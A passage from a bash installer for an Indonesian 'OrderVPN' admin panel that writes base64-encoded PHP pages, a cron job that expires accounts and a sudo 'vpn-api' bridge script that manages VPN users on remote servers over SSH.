TkxJTkU8L3NwYW4+JyA6ICc8c3BhbiBjbGFzcz0iYmFkZ2UgYi13YXJuaW5nIj5ERUdSPC9zcGFuPicpOwp9CgpmdW5jdGlvbiB1cGRhdGVDZWxsKGNscywgY29kZSwgaHRtbCkgewogICAgdHJ5IHsKICAgICAgICB2YXIgc2FmZSA9IENTUy5lc2NhcGUoY29kZSk7CiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLm1vbi0nICsgY2xzICsgJ1tkYXRhLWNvZGU9IicgKyBzYWZlICsgJyJdJykuZm9yRWFjaChmdW5jdGlvbihlbCkgewogICAgICAgICAgICBlbC5pbm5lckhUTUwgPSBodG1sOwogICAgICAgIH0pOwogICAgfSBjYXRjaChlKSB7CiAgICAgICAgLy8gRmFsbGJhY2sgZm9yIGJyb3dzZXJzIHdpdGhvdXQgQ1NTLmVzY2FwZQogICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ1tkYXRhLWNvZGU9IicgKyBjb2RlICsgJyJdLm1vbi0nICsgY2xzKS5mb3JFYWNoKGZ1bmN0aW9uKGVsKSB7CiAgICAgICAgICAgIGVsLmlubmVySFRNTCA9IGh0bWw7CiAgICAgICAgfSk7CiAgICB9Cn0KCmZ1bmN0aW9uIGNvbG9yQnlMb2FkKHZhbCwgdHlwZSkgewogICAgY29uc3QgdiA9IHBhcnNlSW50KHZhbCk7CiAgICBsZXQgY29sb3IgPSAndmFyKC0tc3VjY2VzcyknOwogICAgaWYgKGlzTmFOKHYpKSByZXR1cm4gdmFsOwogICAgaWYgKHR5cGUgPT09ICdjcHUnKSB7CiAgICAgICAgaWYgKHYgPiAyMDApIGNvbG9yID0gJ3ZhcigtLWRhbmdlciknOwogICAgICAgIGVsc2UgaWYgKHYgPiAxMDApIGNvbG9yID0gJ3ZhcigtLXdhcm5pbmcpJzsKICAgIH0gZWxzZSBpZiAodHlwZSA9PT0gJ3JhbScpIHsKICAgICAgICBpZiAodiA+IDkwKSBjb2xvciA9ICd2YXIoLS1kYW5nZXIpJzsKICAgICAgICBlbHNlIGlmICh2ID4gNzApIGNvbG9yID0gJ3ZhcigtLXdhcm5pbmcpJzsKICAgIH0KICAgIHJldHVybiAnPHNwYW4gc3R5bGU9ImNvbG9yOicgKyBjb2xvciArICc7Zm9udC13ZWlnaHQ6NjAwIj4nICsgdmFsICsgJzwvc3Bhbj4nOwp9CgovLyBTdGFydCBtb25pdG9yaW5nIHdoZW4gc2VydmVycyB0YWIgaXMgc2hvd24KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpID0+IHsKICAgIC8vIFdhdGNoIGZvciB0YWIgc3dpdGNoZXMKICAgIGNvbnN0IG9ic2VydmVyID0gbmV3IE11dGF0aW9uT2JzZXJ2ZXIoKCkgPT4gewogICAgICAgIGNvbnN0IHNlcnZlcnNUYWIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGFiLXNlcnZlcnMnKTsKICAgICAgICBpZiAoc2VydmVyc1RhYiAmJiBzZXJ2ZXJzVGFiLmNsYXNzTGlzdC5jb250YWlucygnYWN0aXZlJykpIHsKICAgICAgICAgICAgc3RhcnRNb25pdG9yUmVmcmVzaCgpOwogICAgICAgIH0KICAgIH0pOwogICAgY29uc3QgdGFiID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RhYi1zZXJ2ZXJzJyk7CiAgICBpZiAodGFiKSBvYnNlcnZlci5vYnNlcnZlKHRhYiwge2F0dHJpYnV0ZXM6IHRydWUsIGF0dHJpYnV0ZUZpbHRlcjogWydjbGFzcyddfSk7CiAgICAvLyBBbHNvIGNoZWNrIG9uIGxvYWQKICAgIGlmICh0YWIgJiYgdGFiLmNsYXNzTGlzdC5jb250YWlucygnYWN0aXZlJykpIHN0YXJ0TW9uaXRvclJlZnJlc2goKTsKfSk7Cjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d > "$DIR"/admin/index.php



    # change_password.php (ganti password admin)



    echo "PD9waHAKc2Vzc2lvbl9zdGFydCgpOwpyZXF1aXJlX29uY2UgX19ESVJfXyAuICcvaW5jbHVkZXMvY29uZmlnLnBocCc7CgppZiAoIWlzc2V0KCRfU0VTU0lPTlsndXNlcl9pZCddKSkgewogICAgaGVhZGVyKCdMb2NhdGlvbjogYWRtaW4vJyk7IGV4aXQ7Cn0KCiRtc2cgPSAnJzsgJG1zZ190eXBlID0gJyc7CmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAkb2xkX3Bhc3MgPSAkX1BPU1RbJ29sZF9wYXNzd29yZCddID8/ICcnOwogICAgJG5ld19wYXNzID0gJF9QT1NUWyduZXdfcGFzc3dvcmQnXSA/PyAnJzsKICAgICRjb25maXJtICA9ICRfUE9TVFsnY29uZmlybV9wYXNzd29yZCddID8/ICcnOwogICAgCiAgICBpZiAoZW1wdHkoJG9sZF9wYXNzKSB8fCBlbXB0eSgkbmV3X3Bhc3MpIHx8IGVtcHR5KCRjb25maXJtKSkgewogICAgICAgICRtc2cgPSAnU2VtdWEgZmllbGQgaGFydXMgZGlpc2khJzsKICAgICAgICAkbXNnX3R5cGUgPSAnZXJyb3InOwogICAgfSBlbHNlaWYgKCRuZXdfcGFzcyAhPT0gJGNvbmZpcm0pIHsKICAgICAgICAkbXNnID0gJ1Bhc3N3b3JkIGJhcnUgdGlkYWsgY29jb2shJzsKICAgICAgICAkbXNnX3R5cGUgPSAnZXJyb3InOwogICAgfSBlbHNlaWYgKHN0cmxlbigkbmV3X3Bhc3MpIDwgNikgewogICAgICAgICRtc2cgPSAnUGFzc3dvcmQgbWluaW1hbCA2IGthcmFrdGVyISc7CiAgICAgICAgJG1zZ190eXBlID0gJ2Vycm9yJzsKICAgIH0gZWxzZSB7CiAgICAgICAgJGRiID0gZ2V0REIoKTsKICAgICAgICAkc3RtdCA9ICRkYi0+cHJlcGFyZSgnU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgV0hFUkUgaWQgPSA/Jyk7CiAgICAgICAgJHN0bXQtPmV4ZWN1dGUoWyRfU0VTU0lPTlsndXNlcl9pZCddXSk7CiAgICAgICAgJHVzZXIgPSAkc3RtdC0+ZmV0Y2goUERPOjpGRVRDSF9BU1NPQyk7CiAgICAgICAgCiAgICAgICAgaWYgKCR1c2VyICYmIHBhc3N3b3JkX3ZlcmlmeSgkb2xkX3Bhc3MsICR1c2VyWydwYXNzd29yZCddKSkgewogICAgICAgICAgICAkbmV3X2hhc2ggPSBwYXNzd29yZF9oYXNoKCRuZXdfcGFzcywgUEFTU1dPUkRfQkNSWVBUKTsKICAgICAgICAgICAgJHN0bXQgPSAkZGItPnByZXBhcmUoJ1VQREFURSB1c2VycyBTRVQgcGFzc3dvcmQgPSA/IFdIRVJFIGlkID0gPycpOwogICAgICAgICAgICAkc3RtdC0+ZXhlY3V0ZShbJG5ld19oYXNoLCAkX1NFU1NJT05bJ3VzZXJfaWQnXV0pOwogICAgICAgICAgICAkbXNnID0gJ1Bhc3N3b3JkIGJlcmhhc2lsIGRpdWJhaCEnOwogICAgICAgICAgICAkbXNnX3R5cGUgPSAnc3VjY2Vzcyc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG1zZyA9ICdQYXNzd29yZCBsYW1hIHNhbGFoISc7CiAgICAgICAgICAgICRtc2dfdHlwZSA9ICdlcnJvcic7CiAgICAgICAgfQogICAgfQp9CgokZGIgPSBnZXREQigpOwokc3RtdCA9ICRkYi0+cHJlcGFyZSgnU0VMRUNUIHVzZXJuYW1lLCBlbWFpbCwgcm9sZSBGUk9NIHVzZXJzIFdIRVJFIGlkID0gPycpOwokc3RtdC0+ZXhlY3V0ZShbJF9TRVNTSU9OWyd1c2VyX2lkJ11dKTsKJHVzZXIgPSAkc3RtdC0+ZmV0Y2goUERPOjpGRVRDSF9BU1NPQyk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJpZCI+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkdhbnRpIFBhc3N3b3JkIC0gT3JkZXJWUE48L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIDpyb290IHsKICAgICAgICAgICAgLS1iZzogIzA4MGMxNDsgLS1jYXJkOiAjMTExODI3OyAtLWJvcmRlcjogIzFlMjkzYjsKICAgICAgICAgICAgLS10ZXh0OiAjZTJlOGYwOyAtLXByaW1hcnk6ICM2MzY2ZjE7IC0tcHJpbWFyeS1kaW06ICM0ZjQ2ZTU7CiAgICAgICAgICAgIC0tZGFuZ2VyOiAjZWY0NDQ0OyAtLXN1Y2Nlc3M6ICMxMGI5ODE7IC0tbXV0ZWQ6ICM2NDc0OGI7CiAgICAgICAgfQogICAgICAgICogeyBtYXJnaW46MDsgcGFkZGluZzowOyBib3gtc2l6aW5nOmJvcmRlci1ib3g7IH0KICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdJbnRlcicsJ1NlZ29lIFVJJyxzeXN0ZW0tdWksc2Fucy1zZXJpZjsKICAgICAgICAgICAgYmFja2dyb3VuZDogdmFyKC0tYmcpOwogICAgICAgICAgICBtaW4taGVpZ2h0OjEwMHZoOyBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OmNlbnRlcjsKICAgICAgICAgICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7CiAgICAgICAgfQogICAgICAgIC5jYXJkIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogdmFyKC0tY2FyZCk7IGJvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czoxNHB4OyBwYWRkaW5nOjM2cHg7IHdpZHRoOjEwMCU7IG1heC13aWR0aDo0MjBweDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCAyMHB4IDUwcHggcmdiYSgwLDAsMCwuNCk7CiAgICAgICAgfQogICAgICAgIC5jYXJkIGgyIHsgY29sb3I6dmFyKC0tdGV4dCk7IHRleHQtYWxpZ246Y2VudGVyOyBtYXJnaW4tYm90dG9tOjZweDsgZm9udC1zaXplOjEuM2VtOyBmb250LXdlaWdodDo3MDA7IGxldHRlci1zcGFjaW5nOi0uMnB4OyB9CiAgICAgICAgLmNhcmQgLnN1YnRpdGxlIHsgY29sb3I6dmFyKC0tbXV0ZWQpOyB0ZXh0LWFsaWduOmNlbnRlcjsgbWFyZ2luLWJvdHRvbToyNHB4OyBmb250LXNpemU6Ljg1ZW07IH0KICAgICAgICAudXNlci1pbmZvIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSg5OSwxMDIsMjQxLC4wNik7IGJvcmRlci1yYWRpdXM6MTBweDsKICAgICAgICAgICAgcGFkZGluZzoxMnB4IDE0cHg7IG1hcmdpbi1ib3R0b206MjBweDsKICAgICAgICAgICAgY29sb3I6IHZhcigtLW11dGVkKTsgZm9udC1zaXplOi44NWVtOyB0ZXh0LWFsaWduOmNlbnRlcjsKICAgICAgICB9CiAgICAgICAgLnVzZXItaW5mbyBzdHJvbmcgeyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7IGZvbnQtd2VpZ2h0OjYwMDsgfQogICAgICAgIC5mb3JtLWdyb3VwIHsgbWFyZ2luLWJvdHRvbToxNHB4OyB9CiAgICAgICAgLmZvcm0tZ3JvdXAgbGFiZWwgeyBkaXNwbGF5OmJsb2NrOyBtYXJnaW4tYm90dG9tOjVweDsgZm9udC1zaXplOi43OGVtOyBmb250LXdlaWdodDo2MDA7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgbGV0dGVyLXNwYWNpbmc6LjVweDsgY29sb3I6dmFyKC0tbXV0ZWQpOyB9CiAgICAgICAgLmZvcm0tZ3JvdXAgaW5wdXQgewogICAgICAgICAgICB3aWR0aDoxMDAlOyBwYWRkaW5nOjExcHggMTRweDsKICAgICAgICAgICAgYmFja2dyb3VuZDp2YXIoLS1iZyk7IGJvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgYm9yZGVyLXJhZGl1czoxMHB4OwogICAgICAgICAgICBjb2xvcjp2YXIoLS10ZXh0KTsgZm9udC1zaXplOi45MmVtOyBmb250LWZhbWlseTppbmhlcml0OwogICAgICAgICAgICB0cmFuc2l0aW9uOiAuMnM7IG91dGxpbmU6bm9uZTsKICAgICAgICB9CiAgICAgICAgLmZvcm0tZ3JvdXAgaW5wdXQ6Zm9jdXMgeyBib3JkZXItY29sb3I6dmFyKC0tcHJpbWFyeSk7IGJveC1zaGFkb3c6IDAgMCAwIDNweCByZ2JhKDk5LDEwMiwyNDEsLjEyKTsgfQogICAgICAgIC5idG4gewogICAgICAgICAgICB3aWR0aDoxMDAlOyBwYWRkaW5nOjEzcHg7IGJvcmRlcjpub25lOyBib3JkZXItcmFkaXVzOjEwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLXByaW1hcnkpOyBjb2xvcjojZmZmOwogICAgICAgICAgICBmb250LXNpemU6LjkzZW07IGZvbnQtd2VpZ2h0OjYwMDsgY3Vyc29yOnBvaW50ZXI7CiAgICAgICAgICAgIHRyYW5zaXRpb246IC4yczsgbGV0dGVyLXNwYWNpbmc6LjJweDsKICAgICAgICB9CiAgICAgICAgLmJ0bjpob3ZlciB7IGJhY2tncm91bmQ6IHZhcigtLXByaW1hcnktZGltKTsgYm94LXNoYWRvdzogMCA2cHggMjBweCByZ2JhKDk5LDEwMiwyNDEsLjMpOyB9CiAgICAgICAgLmFsZXJ0IHsgcGFkZGluZzoxMHB4IDE0cHg7IGJvcmRlci1yYWRpdXM6OHB4OyBtYXJnaW4tYm90dG9tOjE0cHg7IGZvbnQtc2l6ZTouODRlbTsgZm9udC13ZWlnaHQ6NTAwOyB9CiAgICAgICAgLmFsZXJ0LXN1Y2Nlc3MgeyBiYWNrZ3JvdW5kOnJnYmEoMTYsMTg1LDEyOSwuMSk7IGNvbG9yOnZhcigtLXN1Y2Nlc3MpOyBib3JkZXI6MXB4IHNvbGlkIHJnYmEoMTYsMTg1LDEyOSwuMik7IH0KICAgICAgICAuYWxlcnQtZXJyb3IgeyBiYWNrZ3JvdW5kOnJnYmEoMjM5LDY4LDY4LC4wOCk7IGNvbG9yOnZhcigtLWRhbmdlcik7IGJvcmRlcjoxcHggc29saWQgcmdiYSgyMzksNjgsNjgsLjE1KTsgfQogICAgICAgIC5iYWNrLWxpbmsgeyBkaXNwbGF5OmJsb2NrOyB0ZXh0LWFsaWduOmNlbnRlcjsgbWFyZ2luLXRvcDoxNnB4OyBjb2xvcjp2YXIoLS1tdXRlZCk7IHRleHQtZGVjb3JhdGlvbjpub25lOyBmb250LXNpemU6LjgyZW07IHRyYW5zaXRpb246LjJzOyB9CiAgICAgICAgLmJhY2stbGluazpob3ZlciB7IGNvbG9yOnZhcigtLXByaW1hcnkpOyB9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8aDI+Q2hhbmdlIFBhc3N3b3JkPC9oMj4KICAgICAgICA8cCBjbGFzcz0ic3VidGl0bGUiPk9yZGVyVlBOIEFkbWluIFBhbmVsPC9wPgogICAgICAgIAogICAgICAgIDxkaXYgY2xhc3M9InVzZXItaW5mbyI+CiAgICAgICAgICAgIExvZ2luIHNlYmFnYWk6IDxzdHJvbmc+PD89IGh0bWxzcGVjaWFsY2hhcnMoJHVzZXJbJ3VzZXJuYW1lJ10pID8+PC9zdHJvbmc+CiAgICAgICAgICAgICg8Pz0gaHRtbHNwZWNpYWxjaGFycygkdXNlclsncm9sZSddKSA/PikKICAgICAgICA8L2Rpdj4KICAgICAgICAKICAgICAgICA8P3BocCBpZiAoJG1zZyk6ID8+CiAgICAgICAgPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtPD89ICRtc2dfdHlwZSA9PT0gJ3N1Y2Nlc3MnID8gJ3N1Y2Nlc3MnIDogJ2Vycm9yJyA/PiI+CiAgICAgICAgICAgIDw/PSBodG1sc3BlY2lhbGNoYXJzKCRtc2cpID8+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgZW5kaWY7ID8+CiAgICAgICAgCiAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8bGFiZWw+UGFzc3dvcmQgTGFtYTwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9Im9sZF9wYXNzd29yZCIgcGxhY2Vob2xkZXI9Ik1hc3Vra2FuIHBhc3N3b3JkIHNhYXQgaW5pIiByZXF1aXJlZD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgPGxhYmVsPlBhc3N3b3JkIEJhcnU8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJuZXdfcGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJNaW5pbWFsIDYga2FyYWt0ZXIiIHJlcXVpcmVkIG1pbmxlbmd0aD0iNiI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxsYWJlbD5Lb25maXJtYXNpIFBhc3N3b3JkIEJhcnU8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJjb25maXJtX3Bhc3N3b3JkIiBwbGFjZWhvbGRlcj0iVWxhbmdpIHBhc3N3b3JkIGJhcnUiIHJlcXVpcmVkIG1pbmxlbmd0aD0iNiI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biI+U2F2ZSBOZXcgUGFzc3dvcmQ8L2J1dHRvbj4KICAgICAgICA8L2Zvcm0+CiAgICAgICAgCiAgICAgICAgPGEgaHJlZj0iYWRtaW4vIiBjbGFzcz0iYmFjay1saW5rIj5CYWNrIHRvIERhc2hib2FyZDwvYT4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=" | base64 -d > "$DIR"/change_password.php



    chmod 644 "$DIR"/change_password.php







    # cron/expire_accounts.php



    echo "PD9waHAKLy8gQ3JvbjogamFsYW5rYW4gc2V0aWFwIGphbSB2aWEgY3JvbnRhYgovLyAwICogKiAqICogcGhwIC92YXIvd3d3L2h0bWwvb3JkZXJ2cG4vY3Jvbi9leHBpcmVfYWNjb3VudHMucGhwCnJlcXVpcmVfb25jZSBfX0RJUl9fLicvLi4vaW5jbHVkZXMvY29uZmlnLnBocCc7CnJlcXVpcmVfb25jZSBfX0RJUl9fLicvLi4vaW5jbHVkZXMvdnBuX21hbmFnZXIucGhwJzsKJGNvdW50ID0gVlBOTWFuYWdlcjo6cHJvY2Vzc0V4cGlyZWRBY2NvdW50cygpOwplY2hvIGRhdGUoJ1ktbS1kIEg6aTpzJykuIiDigJQgRXhwaXJlZCB7JGNvdW50fSBhY2NvdW50c1xuIjsK" | base64 -d > "$DIR"/cron/expire_accounts.php



    sed -i "s|define('DB_PASS', 'password123')|define('DB_PASS', '${ESCAPED_DB_PASS}')|g" "$DIR/includes/config.php"



}







_ordervpn_deploy_bridge() {



    local BRIDGE="/usr/local/bin/vpn-api"



    echo "IyEvYmluL2Jhc2gKIyBWUE4tQVBJIEJyaWRnZSB2Mi4wIOKAlCBTZWN1cml0eSBIYXJkZW5lZAojIEhhbnlhIGRpcGFuZ2dpbCB2aWEgc3VkbyBvbGVoIHd3dy1kYXRhCnNldCAtdW8gcGlwZWZhaWwKClhSQVlfQ09ORklHPSIvdXNyL2xvY2FsL2V0Yy94cmF5L2NvbmZpZy5qc29uIgpBS1VOX0RJUj0iL3Jvb3QvYWt1biIKUFVCTElDX0hUTUw9Ii92YXIvd3d3L2h0bWwiCkxPR19GSUxFPSIvdmFyL2xvZy92cG4tYXBpLmxvZyIKCiMgPT09IE1VTFRJLVZQUzogU1NIIFJFTU9URSBFWEVDVVRJT04gPT09CiMgRGlwYW5nZ2lsIGppa2EgLS1zZXJ2ZXIgPGNvZGU+IGRpYmVyaWthbgojICAgMS4gUXVlcnkgZGF0YWJhc2UgdW50dWsga3JlZGVuc2lhbCBTU0ggc2VydmVyCiMgICAyLiBTU0gga2UgcmVtb3RlIHNlcnZlciAmIGphbGFua2FuIHZwbi1hcGkgeWFuZyBzYW1hCiMgICAzLiBSZXR1cm4gaGFzaWxueWEKcmVtb3RlX2V4ZWMoKSB7CiAgICBsb2NhbCBjb2RlPSIkMSIgYWN0aW9uPSIkMiIKICAgICMgU2FuaXRpemU6IGVzY2FwZSBzaW5nbGUgcXVvdGVzIHVudHVrIG1lbmNlZ2FoIFNRTCBpbmplY3Rpb24KICAgIGxvY2FsIHE9IiciOyBsb2NhbCBzYWZlX2NvZGU9IiR7Y29kZS8vJHEvJHEkcX0iIHByb3RvPSIkMyIgdXNlcj0iJDQiIGRheXM9IiQ1IiBxdW90YT0iJDYiIGlwbGltaXQ9IiQ3IgoKICAgICMgUXVlcnkgZGF0YWJhc2UgdW50dWsgU1NIIGNyZWRlbnRpYWxzCiAgICBsb2NhbCBkYl9ob3N0IGRiX3BvcnQgc3NoX3VzZXIgc3NoX3Bhc3Mgc3NoX2tleQogICAgbG9jYWwgZGJfcmVzdWx0CiAgICBkYl9yZXN1bHQ9JChteXNxbCAtTiAtQiAtZSAiCiAgICAgICAgU0VMRUNUIGhvc3QsIHBvcnQsIHNzaF91c2VyLCBDT0FMRVNDRShzc2hfcGFzc3dvcmQsJycpLCBDT0FMRVNDRShzc2hfa2V5LCcnKQogICAgICAgIEZST00gc2VydmVycyBXSEVSRSBjb2RlX3NlcnZlciA9ICckc2FmZV9jb2RlJyBBTkQgc3RhdHVzID0gJ3JlYWR5JwogICAgICAgIExJTUlUIDEKICAgICIgb3JkZXJ2cG4gMj4vZGV2L251bGwpCgogICAgaWYgW1sgLXogIiRkYl9yZXN1bHQiIF1dOyB0aGVuCiAgICAgICAgZWNobyAie1wic3VjY2Vzc1wiOmZhbHNlLFwibWVzc2FnZVwiOlwiU2VydmVyICRjb2RlIHRpZGFrIGRpdGVtdWthbiBhdGF1IG9mZmxpbmVcIn0iCiAgICAgICAgcmV0dXJuIDEKICAgIGZpCgogICAgZGJfaG9zdD0kKGVjaG8gIiRkYl9yZXN1bHQiIHwgYXdrICd7cHJpbnQgJDF9JykKICAgIGRiX3BvcnQ9JChlY2hvICIkZGJfcmVzdWx0IiB8IGF3ayAne3ByaW50ICQyfScpCiAgICBzc2hfdXNlcj0kKGVjaG8gIiRkYl9yZXN1bHQiIHwgYXdrICd7cHJpbnQgJDN9JykKICAgIHNzaF9wYXNzPSQoZWNobyAiJGRiX3Jlc3VsdCIgfCBhd2sgJ3twcmludCAkNH0nKQogICAgc3NoX2tleT0kKGVjaG8gIiRkYl9yZXN1bHQiIHwgYXdrICd7cHJpbnQgJDV9JykKCiAgICAjIEluc3RhbGwgc3NocGFzcyBqaWthIGJlbHVtIGFkYSAoaGFueWEgYnV0dWggYmViZXJhcGEgZGV0aWsgcGVydGFtYSBrYWxpKQogICAgaWYgISBjb21tYW5kIC12IHNzaHBhc3MgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgYXB0LWdldCBpbnN0YWxsIC15IHNzaHBhc3MgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKICAgIGZpCgogICAgIyBQaWxpaCBtZXRvZGUgYXV0aDogU1NIIGtleSA+IHBhc3N3b3JkCiAgICBsb2NhbCBzc2hfY21kCiAgICBpZiBbWyAtbiAiJHNzaF9rZXkiICYmIC1mICIkc3NoX2tleSIgXV07IHRoZW4KICAgICAgICBzc2hfY21kPSJzc2ggLWkgJyRzc2hfa2V5JyAtcCAkZGJfcG9ydCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gQ29ubmVjdFRpbWVvdXQ9MTAgLW8gQmF0Y2hNb2RlPXllcyAke3NzaF91c2VyfUAke2RiX2hvc3R9IgogICAgZWxpZiBbWyAtbiAiJHNzaF9wYXNzIiBdXTsgdGhlbgogICAgICAgIHNzaF9jbWQ9IlNTSFBBU1M9JyRzc2hfcGFzcycgc3NocGFzcyAtZSBzc2ggLXAgJGRiX3BvcnQgLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwICR7c3NoX3VzZXJ9QCR7ZGJfaG9zdH0iCiAgICBlbHNlCiAgICAgICAgZWNobyAie1wic3VjY2Vzc1wiOmZhbHNlLFwibWVzc2FnZVwiOlwiU2VydmVyICRjb2RlIHRpZGFrIHB1bnlhIHBhc3N3b3JkIGF0YXUgU1NIIGtleVwifSIKICAgICAgICByZXR1cm4gMQogICAgZmkKCiAgICAjIEJhbmd1biBjb21tYW5kIHJlbW90ZTogdnBuLWFwaSA8YWN0aW9uPiA8cHJvdG8+IDx1c2VyPiA8ZGF5cz4gPHF1b3RhPiA8aXBsaW1pdD4KICAgIGxvY2FsIHJlbW90ZV9hcmdzPSIkYWN0aW9uICRwcm90byAkdXNlciAkZGF5cyAkcXVvdGEgJGlwbGltaXQiCiAgICBsb2NhbCByZW1vdGVfb3V0cHV0CiAgICByZW1vdGVfb3V0cHV0PSQodGltZW91dCAzMCAkc3NoX2NtZCAic3VkbyAvdXNyL2xvY2FsL2Jpbi92cG4tYXBpICRyZW1vdGVfYXJncyIgMj4vZGV2L251bGwpCgogICAgaWYgW1sgJD8gLWVxIDAgJiYgLW4gIiRyZW1vdGVfb3V0cHV0IiBdXTsgdGhlbgogICAgICAgIGVjaG8gIiRyZW1vdGVfb3V0cHV0IgogICAgICAgIHJldHVybiAwCiAgICBlbHNlCiAgICAgICAgZWNobyAie1wic3VjY2Vzc1wiOmZhbHNlLFwibWVzc2FnZVwiOlwiR2FnYWwga29uZWtzaSBrZSBzZXJ2ZXIgJGNvZGUgKCRkYl9ob3N0OiRkYl9wb3J0KS4gUGFzdGlrYW4gc2VydmVyIG9ubGluZSAmIHZwbi1hcGkgdGVyaW5zdGFsbC5cIn0iIAogICAgICAgIHJldHVybiAxCiAgICBmaQp9CgpSTF9ESVI9Ii90bXAvdnBuLWFwaS1ybCIKQ09ORklHX0xPQ0s9Ii90bXAvdnBuLWFwaS1jb25maWcubG9jayIKClNFUlZFUl9DT0RFPSIiICAgICAgICAgICAgICAgIyBNdWx0aS1WUFM6IC0tc2VydmVyIDxjb2RlPgpBQ1RJT049IiQxIjsgUFJPVE9DT0w9IiQyIjsgVVNFUk5BTUU9IiQzIjsgREFZUz0iJDQiOyBRVU9UQT0iJHs1Oi0xMDB9IjsgSVBMSU1JVD0iJHs2Oi0yfSIKQ0FMTEVSPSIke1NVRE9fVVNFUjotdW5rbm93bn0iCgojID09PSBQQVJTRSAtLXNlcnZlciA8Y29kZT4gPT09CmZvciBpIGluICQoc2VxIDEgJCMpOyBkbwogICAgaWYgW1sgIiR7IWl9IiA9PSAiLS1zZXJ2ZXIiIF1dOyB0aGVuCiAgICAgICAgbnh0PSQoKGkrMSkpCiAgICAgICAgU0VSVkVSX0NPREU9IiR7IW54dH0iCiAgICAgICAgIyBIYXB1cyAtLXNlcnZlciBkYW4gbmlsYWlueWEgZGFyaSBwb3NpdGlvbmFsIHBhcmFtcwogICAgICAgIHNldCAtLSAiJHtAOjE6aS0xfSIgIiR7QDpueHQrMX0iCiAgICAgICAgQUNUSU9OPSIkMSI7IFBST1RPQ09MPSIkMiI7IFVTRVJOQU1FPSIkMyI7IERBWVM9IiQ0IjsgUVVPVEE9IiR7NTotMTAwfSI7IElQTElNSVQ9IiR7NjotMn0iCiAgICAgICAgYnJlYWsKICAgIGZpCmRvbmUKCiMgPT09IExPR0dJTkcgPT09CmxvZ19ldmVudCgpIHsKICAgIGxvY2FsIHN1Y2Nlc3M9IiQxIiBtc2c9IiQyIgogICAgcHJpbnRmICJbJXNdIEFDVElPTj0lcyBQUk9UT0NPTD0lcyBVU0VSPSVzIENBTExFUj0lcyBTVUNDRVNTPSVzIE1TRz0lc1xuIiBcCiAgICAgICAgIiQoZGF0ZSAtSXNlY29uZHMpIiAiJEFDVElPTiIgIiRQUk9UT0NPTCIgIiRVU0VSTkFNRSIgIiRDQUxMRVIiICIkc3VjY2VzcyIgIiRtc2ciID4+ICIkTE9HX0ZJTEUiIDI+L2Rldi9udWxsIHx8IHRydWUKfQoKIyA9PT0gSU5QVVQgVkFMSURBVElPTiA9PT0KdmFsaWRhdGVfdXNlcm5hbWUoKSB7CiAgICBsb2NhbCB1PSIkMSIKICAgIFtbIC16ICIkdSIgXV0gJiYgcmV0dXJuIDEKICAgIFtbICR7I3V9IC1ndCAzMiBdXSAmJiB7IGVjaG8gJ3sic3VjY2VzcyI6ZmFsc2UsIm1lc3NhZ2UiOiJVc2VybmFtZSBtYWtzaW1hbCAzMiBrYXJha3RlciJ9JzsgZXhp